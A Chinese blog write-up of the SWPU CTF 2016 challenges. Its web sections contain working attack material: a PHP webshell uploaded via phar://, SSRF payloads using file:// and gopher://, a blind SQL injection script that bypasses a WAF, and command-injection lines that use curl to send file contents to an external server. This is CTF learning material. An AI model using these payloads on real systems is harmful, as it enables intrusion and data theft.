@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      SWPU-CTF-2016-writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="上周打了下西南石油大学的 SWPU，web 题质量还是不错的，学到了很多东西 (还认识了西南石油的 answer 师傅，好开心(≧∇≦)/ web50没什么好说的，flag 在源码里，f12 就看到了 web100打开后出现提示 Tips1: include.php,访问下又出现了提示 Tips: the parameter is file! :)，源码里又发现了 upload.php 访问 up">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SWPU-CTF-2016-writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2016/10/31/SWPU-CTF-2016-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="上周打了下西南石油大学的 SWPU，web 题质量还是不错的，学到了很多东西 (还认识了西南石油的 answer 师傅，好开心(≧∇≦)/ web50没什么好说的，flag 在源码里，f12 就看到了 web100打开后出现提示 Tips1: include.php,访问下又出现了提示 Tips: the parameter is file! :)，源码里又发现了 upload.php 访问 up">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/001.jpg233.jpg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/002.jpg002.jpg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/003.jpg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/004.jpg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/005.jpg">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SWPU-CTF-2016-writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="上周打了下西南石油大学的 SWPU，web 题质量还是不错的，学到了很多东西 (还认识了西南石油的 answer 师傅，好开心(≧∇≦)/ web50没什么好说的，flag 在源码里，f12 就看到了 web100打开后出现提示 Tips1: include.php,访问下又出现了提示 Tips: the parameter is file! :)，源码里又发现了 upload.php 访问 up">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/001.jpg233.jpg">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">SWPU-CTF-2016-writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-10-31" class="post-meta__date date">2016-10-31</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>上周打了下西南石油大学的 SWPU，web 题质量还是不错的，学到了很多东西 (还认识了西南石油的 answer 师傅，好开心(≧∇≦)/</p>
+<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>没什么好说的，flag 在源码里，f12 就看到了</p>
+<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>打开后出现提示 <code>Tips1: include.php</code>,访问下又出现了提示 <code>Tips: the parameter is file! :)</code>，源码里又发现了 <code>upload.php</code></p>
+<p>访问 upload.php,是一个上传文件的表单，测试了下发现只能上传图片格式的文件，后缀名和MIME类型都进行了检测，空字节截断的方法早就不能用了，刚开始毫无思路</p>
+<p>后来想到了 include.php 还没用，发现修改file参数为 <code>?file=upload</code> 后，upload.php 被 include 了进来，那么就是利用php伪协议来读取源码了</p>
+<p>include.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>upload.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $_FILE[<span class="string">"file"</span>];</span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    @$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> (((@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">    &amp;&amp; (@$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>) &amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">    &#123;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"file upload successful!Save in:  "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"upload failed!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>验证了之前的猜想，后缀名和 MIME 类型都进行检测了</p>
+<p>那么就和之前做的一道CTF题差不多了，可以利用 zip伪协议，几经测试后发现上传的 shell 并没有执行，后来想到了是 zip协议 被禁用了，谷歌了下发现了 phar伪协议，利用方式与 zip协议 类似，只不过把<code>#</code>换成了<code>/</code></p>
+<p>shell.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>上传 shell.jpg 后，就可以 getshell 了</p>
+<h3 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h3><p>第一次做出300分的 web 题，土师傅无敌<br>输入 URL，可以得到对应网站源码的回显，那么可以用 file协议 读取它的内网 IP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web5.08067.me/index.php?url=file%3A%2F%2F%2Fetc%2Fsysconfig%2Fnetwork-scripts%2Fifcfg-eth0</span><br></pre></td></tr></table></figure></p>
+<p>读出来的IP是 <code>172.16.181.165</code>,然后提示是 ssrf，那么 flag 肯定不在这台机器上了。直接用 burp 爆破这个网段，发现了 <code>172.16.181.166</code> 存在，回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome swpu ctf!!!</span><br></pre></td></tr></table></figure></p>
+<p>那么 flag 应该在这台机器上了<br>然后我们再用神器 burp 扫下这台机器的路径，发现存在 <code>/admin/login.php</code>,访问得到<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">wllmctf_login.php</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"no-margins"</span>&gt;</span>后台登录<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control uname"</span> <span class="attr">id</span>=<span class="string">"user"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"用户名"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control pword m-b"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"密码"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success btn-block"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来就是登陆这个后台了，可是没办法直接 POST 数据过去，想到可以利用 gopher协议 POST 数据到内网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web5.08067.me/index.php?url=gopher%3A%2f%2f172.16.181.166%3A80%2f_POST%20%2fadmin%2fwllmctf_login.php%2520HTTP%2f1.1%250d%250aHost%3A%20172.16.181.166%250d%250aUser-Agent%3A%20curl%2f7.43.0%250d%250aAccept%3A%20%2a%2f%2a%250d%250aContent-Length%3A%2036%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3D233</span><br></pre></td></tr></table></figure></p>
+<p>测试的时候发现密码长度必须&gt;=10,否则服务器会不响应，这算作是第一个坑吧<br>盲注得到用户名及密码 admin xiaozhang123<br>最后的 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web5.08067.me/index.php?url=gopher%3A%2f%2f172.16.181.166%3A80%2f_POST%20%2fadmin%2fwllmctf_login.php%2520HTTP%2f1.1%250d%250aHost%3A%20172.16.181.166%250d%250aUser-Agent%3A%20curl%2f7.43.0%250d%250aAccept%3A%20%2a%2f%2a%250d%250aContent-Length%3A%2036%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dxiaozhang123</span><br></pre></td></tr></table></figure></p>
+<p>得到 flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;It_iS_s0_ea3y_!!!!!!!!!_FUCK_!!!!!&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里还有第二个大坑，你在表单里输入的url，服务器在搜索前会先 url encode 一次，所以你需要在表单中输入原始的 payload 或者在地址栏中输入 url encode 后的 payload。我当时直接在地址栏中输入了原始的 payload，一直不响应，坑了好久，让我一直以为是 gopher协议 利用方式不对</p>
+<p>关于 gopher协议 在 ssrf 中的利用，参考长亭的这篇<a href="https://blog.chaitin.com/gopher-attack-surfaces/" target="_blank" rel="external">文章</a></p>
+<h3 id="misc100"><a href="#misc100" class="headerlink" title="misc100"></a>misc100</h3><p>给了一串 js fuck，直接丢到 console 里，弹窗出来 brain fuck，随便找个在线解密网站就解出来了<br>值得注意的是 firefox 可以直接复制弹窗的内容</p>
+<h3 id="misc100-2"><a href="#misc100-2" class="headerlink" title="misc100-2"></a>misc100-2</h3><p>一张图片，用 stegsolve 查看后发现这一串 BASE32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OZRGW4L3OVVUG22TL53HEZDVPJ2HKY2DKZIVQVTVOZ5HKY3LOJ3HIWSEKVBFIR2ZKNVXMY3LOR3H2===</span><br></pre></td></tr></table></figure></p>
+<p>base32 decode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbkq&#123;ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先是想到的凯撒加密，前面四个字母肯定是 flag，但是前两位是右移10位，后两位是左移 10 位。当然不是简单的两位两位的来分组，想到了之前在i春秋上做的一道题，和这个类似，是根据字母在字母表中位置的奇偶性来分组的。直接上解密脚本吧(代码写的比较丑,轻喷= =):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line">text = <span class="string">"vbkq&#123;ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv&#125;"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">    pos = ord(char)</span><br><span class="line"><span class="keyword">if</span> char != <span class="string">'&#123;'</span> <span class="keyword">and</span> char != <span class="string">'&#125;'</span> <span class="keyword">and</span> char != <span class="string">'_'</span>:</span><br><span class="line">        <span class="keyword">if</span> (pos &gt;= <span class="number">65</span> <span class="keyword">and</span> pos &lt;= <span class="number">90</span>):</span><br><span class="line">            <span class="keyword">if</span> (pos - <span class="number">65</span>) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                temp = (pos - <span class="number">65</span> + <span class="number">10</span>) % <span class="number">26</span></span><br><span class="line">                char = chr(temp + <span class="number">65</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = (pos - <span class="number">65</span> - <span class="number">10</span>) % <span class="number">26</span></span><br><span class="line">                char = chr(temp + <span class="number">65</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> (pos - <span class="number">97</span>) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                temp = (pos - <span class="number">97</span> + <span class="number">10</span>) % <span class="number">26</span></span><br><span class="line">                char = chr(temp + <span class="number">97</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = (pos - <span class="number">97</span> - <span class="number">10</span>) % <span class="number">26</span></span><br><span class="line">                char = chr(temp + <span class="number">97</span>)  </span><br><span class="line">    flag = flag + char</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<pre><code>下面的这几道题是比赛中没做出来的，看下别人的 wp 再做下整理下解题过程以供学习
+</code></pre><h3 id="web200-1"><a href="#web200-1" class="headerlink" title="web200-1"></a>web200-1</h3><p>响应头里有提示，base64 decode 后<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query=<span class="string">"SELECT * FROM admin WHERE uname='"</span>.$uname.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span>($row[<span class="string">'passwd'</span>] === $passwd)</span><br><span class="line">&#123;</span><br><span class="line">	$_SESSION[<span class="string">'flag'</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>明显的注入题，本来想用 <code>union select</code> 来绕过的，结果弹窗提示 <code>illegal character!!@_@</code>，说明是有WAF的，经测试发现发现以下关键字都被禁止了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union or and + , * 空格 &lt;TAB&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以用的有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select () from where sleep = &apos;</span><br></pre></td></tr></table></figure></p>
+<p>其他一些不含被 ban 关键字的 mysql 函数</p>
+<p>还可以发现用户名为 <code>admin</code> 时提示 <code>password error!!@_@</code>，其他用户名时则为 <code>username error!!@_@</code>，这么看来 admin 表中只有一条记录，那么我们的目标就是 <code>SELECT passwd FROM admin</code></p>
+<p>接下来的问题就是怎么构造注入语句了，这里有三个问题。<br>第一个问题是空格和*被过滤了，也就不能用注释替代空格了。网上找到了一种方法，可以用圆括号  <a href="http://www.lijiejie.com/mysql-injection-bypass-waf-2/" target="_blank" rel="external">http://www.lijiejie.com/mysql-injection-bypass-waf-2/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT passwd FROM admin WHERE 1=1;</span><br><span class="line">SELECT(passwd)FROM(admin)WHERE(1=1);</span><br></pre></td></tr></table></figure></p>
+<p>这两句的作用是一样的，因为在MYSQL中圆括号是表示一个子查询，那么能求值的地方都可以用括号包起来，包括数据库名、表名、字段名</p>
+<p>第二个问题是 and or union 被过滤后如何连接查询语句，MYSQL 的 WHERE 子句允许这种比较<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT passwd FROM admin WHERE uname=&apos;-1&apos;=1=&apos;0&apos;;</span><br><span class="line">SELECT passwd FROM admin;</span><br></pre></td></tr></table></figure></p>
+<p>两句效果相同，第一句的比较过程从左到右，<code>uname=&#39;-1&#39;</code> 为假，<code>1</code> 为我们构造的查询语句，如果是真的话(如果没取出记录的话为假)，那么比较结果为假，再与 <code>&#39;0&#39;</code> 进行比较，则比较结果为真</p>
+<p>第三个问题是我们在解决了第一二个问题后，肯定要通过 <code>substring</code> 或 <code>mid</code> 来进行逐位爆破passwd字段了，逗号被过滤了，看下官方文档，发现了定义中就有解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING(str,pos), SUBSTRING(str FROM pos), SUBSTRING(str,pos,len), SUBSTRING(str FROM pos FOR len)</span><br></pre></td></tr></table></figure></p>
+<p>可以用 from 和 for 来替换逗号，但是 or 被 ban 了，所以 for 也不能用了，没问题，我们可以从最后一个字符往前爆破</p>
+<p>问题解决，下面开始注入，先用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos;=(select(1)from(admin)where(length(passwd)&gt;10))=&apos;0&amp;passwd=test</span><br><span class="line">uname=&apos;=(select(1)from(admin)where(length(passwd)&gt;20))=&apos;0&amp;passwd=test</span><br></pre></td></tr></table></figure></p>
+<p>手工测试出 passwd 的长度为 32，那么应该是 32 位的 md5 值，字符范围为 0-9 a-f<br>然后是盲注最后一个字符的语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos;=(select(1)from(admin)where((substring((passwd)from(32)))=&apos;f&apos;))=&apos;0&amp;passwd=test</span><br></pre></td></tr></table></figure></p>
+<p>写一个盲注脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'1234567890abcdef'</span>:</span><br><span class="line">		length = <span class="number">32</span> - i</span><br><span class="line">		payload = &#123;<span class="string">"uname"</span>:<span class="string">"uname=233'=(select(1)from(admin)where(substring((passwd)from("</span> + str(length) + <span class="string">")))='"</span> + str(j) + str(flag) + <span class="string">"')='"</span>,<span class="string">"passwd"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">		r = requests.post(<span class="string">'http://web1.08067.me/login.php'</span>,data = payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			flag = str(j) + flag</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<p>得到 passwd <code>c12366feb7373bf6d869ab7d581215cf</code><br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/001.jpg233.jpg" alt="001.jpg"></p>
+<p>经过 md5 查询得到 <code>1234567mn</code></p>
+<p>然后登录系统<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/002.jpg002.jpg" alt="002.jpg"></p>
+<p>可以执行 shell 命令，但是过滤了空格，而且执行成功没有回显，只会提示<code>命令执行成功！！</code></p>
+<p>空格可以用<tab>替换，回显可以 curl 执行的结果到自己服务器上，又学到了新姿势～(反引号 <strong>`</strong> 是用来将一个命令的标准输出插在命令行中的任意位置，也就是说会先执行反引号内的命令，然后替换成执行结果)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ord=curl    http://xxx/`ls  |   head    -n  1`</span><br><span class="line">ord=curl    http://xxx/`ls  |   head    -n  2`</span><br></pre></td></tr></table></figure></tab></p>
+<p>依次获取当前目录下的文件(夹)名，这里可以用 burp 跑<br>在服务器的 access_log 文件里可以看到访问记录，关于日志文件的解释可以查看这篇文章 <a href="http://blog.csdn.net/zhuying_linux/article/details/6773912" target="_blank" rel="external">http://blog.csdn.net/zhuying_linux/article/details/6773912</a></p>
+<p>最后 flag 在<code>../../</code>下<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/003.jpg" alt="003.jpg"></p>
+<p>构造如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord=curl	http://119.29.138.57/`cat	../../flag`</span><br></pre></td></tr></table></figure></p>
+<p>获得 flag<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/004.jpg" alt="004.jpg"></p>
+<p>这道题还是学到了不少知识的，感谢大牛的 wp</p>
+<h3 id="misc150"><a href="#misc150" class="headerlink" title="misc150"></a>misc150</h3><p>第一步是从数据包中导出 flag.zip，这一步很简单，但是下面就懵逼了，解压 zip 得到 ce.txt，打开后一看一堆这样的数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">254, 255, 255</span><br><span class="line">252, 253, 253</span><br><span class="line">197, 198, 198</span><br><span class="line">46, 47, 47</span><br><span class="line">12, 13, 13</span><br><span class="line">62, 63, 63</span><br><span class="line">213, 214, 214</span><br><span class="line">254, 255, 255</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>完全不知道这是什么东西，等结束后看了下别人的 wp 才知道这是 RGB 三原色的值，可以将 RGB 三原色按照不同的比例相加来产生各种各样的色光，这道题是采用八位二进制数字对应的十进制值来表示的，最小为 0，最大为 255。除此之外还可以用浮点数、百分比来表示，但都是用来表示它们三个的比例</p>
+<p>那么这题就是要还原出一幅图片了<br>首先计算下行数来确定宽和高，可以用 shell 命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat -n ce.txt | tail -n 1</span><br><span class="line">98457	254, 255, 255</span><br></pre></td></tr></table></figure></p>
+<p>98457 = 3 <em> 37 </em> 887 = 117 * 887<br>结合 flag 一般是一长串，确定宽是 887，高是 117</p>
